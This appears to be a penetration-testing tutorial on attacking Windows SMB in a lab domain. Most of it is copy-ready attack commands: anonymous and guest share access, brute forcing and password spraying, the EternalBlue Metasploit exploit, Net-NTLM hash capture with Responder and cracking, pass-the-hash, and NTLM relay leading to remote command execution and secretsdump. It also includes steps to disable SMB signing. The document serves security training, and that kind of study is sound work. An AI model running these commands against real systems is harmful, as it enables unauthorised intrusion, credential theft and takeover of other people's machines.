## What is SMB?

SMB (`Server Message Block`) is a network protocol that was developed for file-sharing. It enables computers to share files, printers and other resources over a network.

## SMB Tools

Different tools can be used to enumerate and exploit SMB.

### smbmap

Installation through `pip'
```sh
python3 -m venv venv
```

```sh
. venv/bin/activate
```

```sh
pip3 install smbmap
```

List shares with anonymous access
```sh
smbmap -H 192.168.122.30
```

List shares with authentication
```sh
smbmap -H 192.168.122.30 -u leo -p "Hexdump123!"
```

List shares with authentication hiding the password with prompt
```sh
smbmap -H 192.168.122.30 -u leo --prompt
```

List files in a given share
```sh
smbmap -H 192.168.122.30 -d hexdump.lab -u leo -p "Hexdump123!" -r "SharedFiles"
```

Read OS version
```sh
smbmap -H 192.168.122.30 -u leo -p "Hexdump123!" -v
```

Check if signing is enabled
```sh
smbmap -H 192.168.122.30 -u leo -p "Hexdump123!" --signing
```

### smbclient

Installation
```sh
sudo pacman -S smbclient
```

Enumerate shares
```sh
smbclient -L //192.168.122.30 -U leo
```

```sh
smbclient -L //192.168.122.30 -U "hexdump.lab/leo%Hexdump123!"
```

Access share
```sh
smbclient //192.168.122.30/SharedFiles -U "hexdump.lab/leo%Hexdump123!"
```

From within the SMB share, you can proceed as follows
- `ls`, to list files
- `cd`, to move between directories
- `get`, to download files
- `put`, to upload files

### netexec

Netexec is the successor of crackmapexec and it is a versatile tool to play with network protocols.
- https://github.com/Pennyw0rth/NetExec
- https://www.netexec.wiki/smb-protocol/enumeration/enumerate-hosts

Install netexec
```sh
yay -S netexec
```

Basic enumeration
```sh
nxc smb 192.168.122.30 -u "leo" -p "Hexdump123!" --shares
```

Authenticate with user and list shares
```sh
nxc smb 192.168.122.30 -u "leo" -p "Hexdump123!" --shares
```

## Threats Associated with SMB

### Scenario 1 - Guest or Anonymous access to Shares

Sometimes it is possible to properly authenticate to SMB even without knowing any credentials. This can be dangerous, as it could leak sensitive data. It could even lead to RCE.

Try to authenticate using `guest` account
```sh
nxc smb 192.168.122.30 -u "someaccountthatdoesntexist" -p "" --shares
```

Try to authenticate using `null session`
```sh
nxc smb 192.168.122.30 -u '' -p '' --users
```

For more information:
- https://sensepost.com/blog/2024/guest-vs-null-session-on-windows/

### Scenario 2 - RCE Via access to Administrative Shares

If it is possible to access administrative shares of SMB such as `ADMIN$`, `C$` and `IPC$`, then it might be possible to obtain Remote Code Execution (RCE).

```sh
smbmap -H 192.168.122.30 -u "Administrator" -p "Password123!"
```

Output
```sh
[+] IP: 192.168.122.30:445      Name: hexdump.lab               Status: ADMIN!!!   
           Disk                                                    Permissions     Comment
           ----                                                    -----------     -------
           ADMIN$                                                  READ, WRITE     Remote Admin
           C$                                                      READ, WRITE     Default share
           IPC$                                                    READ ONLY       Remote IPC
           NETLOGON                                                READ, WRITE     Logon server share 
           SharedFiles                                             READ, WRITE
           SYSVOL                                                  READ, WRITE     Logon server share
```

To execute commands using smbmap
```sh
smbmap -H 192.168.122.30 -u administrator -p "Password123!" -x 'whoami'
```

### Scenario 3 - SMB Brute Forcing

We can use `legba` (developed by evilsocket) to bruteforce access to SMB.
  - https://github.com/evilsocket/legba

Get shell within legba docker
```sh
docker run --entrypoint "/bin/bash" -v $(pwd)/wordlists:/data --network host -it evilsocket/legba:latest
```

Bruteforce administrator password
```sh
legba smb --smb-workgroup hexdump.lab --smb-share "C$" --username administrator --password ./passwords.txt --target 192.168.122.30
```

Bruteforce leo password
```sh
legba smb --smb-workgroup hexdump.lab --smb-share "SharedFiles" --username leo --password ./passwords.txt --target 192.168.122.30
```

### Scenario 4 - SMB Password Spraying

We can use `netexec' to perform password spraying.

The idea of `password spraying` is to use a limited set of passwords to try and authenticate with a large set of accounts. This is often useful because passwords are common and many times multiple users can use the same password.

```sh
nxc smb 192.168.122.30 -u "leo" -p passwords.txt
```

Using both a password and user file
```sh
nxc smb ip.txt -u users.txt -p passwords.txt --continue-on-success
```

### Scenario 5 - SMBv1 EternalBlue (CVE-2017-0144)

Older systems running SMBv1 can be vulnerable to dangerous attacks, such as `EternalBlue`, also known as `CVE-2017-0144` or `MS-17-010`.

For example, you can use the following resources to play around with
  vulnerable machines:

- TryHackMe, Blue
    - Machine: https://tryhackme.com/room/blue
    - OVA: https://darkstar7471.com/resources.html

- Hack The Box, Legacy
    - https://www.hackthebox.com/machines/legacy

Enumerate vulnerable configuration
```sh
nmap -p445 --script smb-vuln-ms17-010 192.168.122.163
```

Setup `msfconsole`
```sh
docker pull metasploitframework/metasploit-framework
```

```sh
docker run --name sploit --rm -dit --network "host" metasploitframework/metasploit-framework
```

```sh
docker exec -it sploit bash
```

Start metasploit
```sh
./msfconsole
```

Scan for vulnerabilty
```sh
use auxiliary/scanner/smb/smb_ms17_010
```

```sh
set RHOSTS 192.168.122.163
```

```sh
run
```

Exploit vulnerability
```sh
use exploit/windows/smb/ms17_010_eternalblue
```

```sh
set RHOSTS 192.168.122.163
```

```sh
run
```

### Scenario 6 - Net-NTLM Capture Attack

When a windows client authenticates to an SMB server, the NTLM hash of the client is sent the server for authentication purposes. Depending on the protocol used, the hash is sent in different ways:
- https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4

- `Net-NTLMv1`
```sh
C = 8-byte server challenge, random
K1 | K2 | K3 = LM/NT-hash | 5-bytes-0
response = DES(K1,C) | DES(K2,C) | DES(K3,C)
```

- `Net-NTLMv2`
```sh
SC = 8-byte server challenge, random
CC = 8-byte client challenge, random
CC* = (X, time, CC2, domain name)
v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)
LMv2 = HMAC-MD5(v2-Hash, SC, CC)
NTv2 = HMAC-MD5(v2-Hash, SC, CC*)
response = LMv2 | CC | NTv2 | CC*
```

It is possible to obtain the Net-NTLM hash of a user by forcing a client to authenticate with a fake SMB server. Possible scenarios:

- Phishing to real users
- After a Reverse shell

To setup the responder we proceed as follows:

Install `responder`
```sh
python3 -m venv venv
```

```sh
. venv/bin/activate
```

```sh
pip3 install impacket
```

```sh
pip3 install netifaces
```

```sh
git clone https://github.com/lgandx/Responder.git
```

Start responder on the network interface shared with the victim
```sh
cd Responder
```

```sh
sudo python3 Responder.py -I eth0
```

From the victim machine, connect back to the linux host
```sh
C:\Users\Quickemu\Downloads> dir \\192.168.122.1\test
Access is denied.
```

This will leak the Net-NTLM hash of the user to the service.

It is then possible to crack such hash.

For Net-NTLMv1
- John
```sh
john --format=netntlm --wordlist=rockyou.txt hash.txt
```

- Hashcat
```sh
hashcat -m 5500 -a 3 hash.txt
```

For Net-NTLMv2
- John
```sh
john --format=netntlmv2 --wordlist=rockyou.txt hash.txt
```

- Hashcat
```sh
hashcat -m 5600 -a 3 hash.txt
```

This is also discussed in:
- Windows Privesc 13 - Windows Hashes

### Scenario 7 - Pass the Hash Attack (PTH)

Let's say that we have managed to obtain the NTLM hashes of one of our users. It is possible to give such hash to SMB in order to authenticate as the user via a so-caleld `pass-the-hash` attack.

Consider for the example the following NTLM hash
```sh
administrator:2B576ACBE6BCFDA7294D6BD18041B8FE
```

We can perform a pass the hash attack with `netexec` as follows
```sh
nxc smb 192.168.122.30 -u administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

```sh
nxc smb 192.168.122.30 -u administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE --shares
```

```sh
nxc smb 192.168.122.30 -u administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE -X "whoami"
```

We can spray the NTLM hash to understand to which user it belongs to.
```sh
nxc smb 192.168.122.30 -u users.txt -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

### Scenario 8 - Net-NTLM Relay Attack

If it is not possible to crack the hash, then we can `relay` it.  This can be done if the SMB server does not require signing.

Check if signing is enabled
```sh
Get-SmbServerConfiguration | Select EnableSMB1Protocol, EnableSMB2Protocol, RequireSecuritySignature
```

Disable signing from GPO
```sh
gpedit.msc
```

```sh
Computer -> Configuration\Windows
         -> Settings\Security
         -> Settings\Local
         -> Policies\Security
         -> Options
```

Disable signing from powershell
```powershell
Set-SmbClientConfiguration -RequireSecuritySignature $false
```

```powershell
Set-SmbServerConfiguration -RequireSecuritySignature $false
```

The relay attack works as follows:

  1. `Interception of Authentication Attempt`

     The victim is lured into authenticating to a malicious SMB server.
     Can be done via phishing, LLMNR/NBNS spoofing, or tricking a user
     into accessing a file share.

  2. `Capture of Net-NTLM Challenge-Response`

     The malicious SMB server captures the Net-NTLM challenge-response.

  3. `Relay to Target SMB`

     Instead of cracking the Net-NTLM hash, the malicious server relays
     it in real-time to another server (the target), to authenticate the
     victim.

  4. `Obtain Unauthorized Access`

Execution steps

Obtain list of SMB servers that do not enforce signing and that can therefore be relayed.
```sh
nxc smb 192.168.122.30 --gen-relay-list out.txt
```

Start server to replay Net-NTLM hash
```sh
sudo ntlmrelayx.py --no-http-server -smb2support -t smb://192.168.122.30 -socks
```

Within the windows machine, force the victim to execute
```sh
dir \\192.168.122.1\test
```

At this point we have established an authenticated SOCKS proxy
```sh
ntlmrelayx> socks
Protocol  Target          Username               AdminStatus  Port 
--------  --------------  ---------------------  -----------  ----
SMB       192.168.122.30  HEXDUMP/ADMINISTRATOR  TRUE         445
```

We can use `proxychains` to proxy our commands using the authenticated session

- `lookupsid.py`
```sh
proxychains lookupsid.py -no-pass -domain-sids hexdump/administrator@192.168.122.30
```

- `secretsdump.py`
```sh
proxychains secretsdump.py -no-pass hexdump/administrator@192.168.122.30
```

- `smbexec.py`
```sh
proxychains smbexec.py -no-pass hexdump/administrator@192.168.122.30
```

---

## References

- https://sensepost.com/blog/2024/guest-vs-null-session-on-windows/
- https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4
- https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing?tabs=group-policy#disable-smb-signing
